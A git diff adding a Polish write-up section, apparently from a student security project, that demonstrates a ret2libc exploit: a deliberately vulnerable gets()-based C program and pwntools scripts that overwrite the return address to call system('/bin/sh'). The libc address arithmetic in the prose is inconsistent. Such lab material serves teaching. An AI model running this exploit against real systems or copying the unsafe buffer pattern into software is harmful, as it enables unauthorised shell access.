@@ -156,11 +156,100 @@ Natomiast skompilowany bez flagi pozwalającej na wykonywanie kodu na stacku nie
 
 ### 1.4 Proof of concept - atak na niewykonywalny stos - ret2libc
 
+Ideą tego exploita podmiana adresu powrotu na adres funkcji z biblioteki `libc`. W tym przypadku interesuje nas funkcja system i wywołanie jej se stringiem `/bin/sh`. Argumenty dla tej funkcji przekazywane są przez stos.
 
+Kod podatnego programu:
+
+```c
+// gcc vuln_2.c -std=c99 -m32 -fno-stack-protector -w -o vuln_2.o
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void secret() {
+    system("sh");
+}
+
+void ask_for_name()
+{
+    char name[16];
+    puts("What's your name?");
+    gets(name);
+    printf("Hi %s!\n", name);
+}
+
+int main()
+{
+    ask_for_name();
+    return 0;
+}
+```
+
+![img_4.png](img/img_7.png)
+
+Włączony jest NX, ale systemowo wyłączyłem ASLR.
+
+Staram się ustalić ile losowych znaków muszę przesłać, aby nadpisać powrót.
+
+```python
+from pwn import *
+
+p = process("./vuln_2.o")
+
+p.readuntil("What's your name?\n")
+
+name = "aaaabbbbccccddddeeeeffffgggghhhhiiii"
+
+p.sendline(name)
+```
+
+![img.png](img/img_3.png)
+
+W `eip` trafiło h.
+
+W tym miejscu chcę wkleić adres funkcji `system` z `libc`.
+
+![img_1.png](img/img_4.png)
+
+Zaraz za tym adresem powinien znajdować się adres powrotu. W tym przypadku nie ma to znaczenia, bo po wywołaniu shell system może wyrzucić sygnał `SEGSIGV`.
+
+Chcę też znależć stringa `/bin/sh`, który może znajdować się również w `libc`.
+
+W tym celu szukam offsetu tego stringa w samej bibliotece i dodaje go do bazowego addresu biblioteki znalezionego w gdb.
+
+Adres ten biorę z gdb.
+
+![img_2.png](img/img_5.png)
+
+String znajduje się na offsecie `18c33c`. Dodaje tą wartość do `f6dcc0000`.
+
+W tym momencie exploit wygląda następująco i powinien dostarczyć nam shell mimo `nonexec` stosu.
+```python
+
+from pwn import *
+
+p = process("./vuln_2.o")
+
+p.readuntil("What's your name?\n")
+
+name = "aaaabbbbccccddddeeeeffffgggg" # junk
+name += '\x10\x0f\xe1\xf7' #address of system in libc
+name += '\x00\x00\x00\x00' # ret
+name += '\x3c\x83\xf5\xf7'#address of binsh in libc 0xfdcc000 + 0x18c33c
+
+
+p.sendline(name)
+
+p.interactive()
+```
+
+![img_3.png](img/img_6.png)
 
 ### 1.5 Wnioski
 
 Kontrolowanie tego czy dane miejsce w pamięci może wykonywać kod jest ważna i pozwala zapobiegać najprostszym atakom typu buffer overflow. Jednak nie jest to remedium na wszystkie ataki.
 
-Ataki typu ROP lub RET2LIBC, które bedą prezentowane w dalszej częsci projektu mogą być wykonane z `nonexec` stosem. Jest to zabezpieczenie dość proste i konieczne.
+Ataki typu ROP lub RET2LIBC mogą być wykonane z `nonexec` stosem. Jest to zabezpieczenie dość proste i konieczne.
 
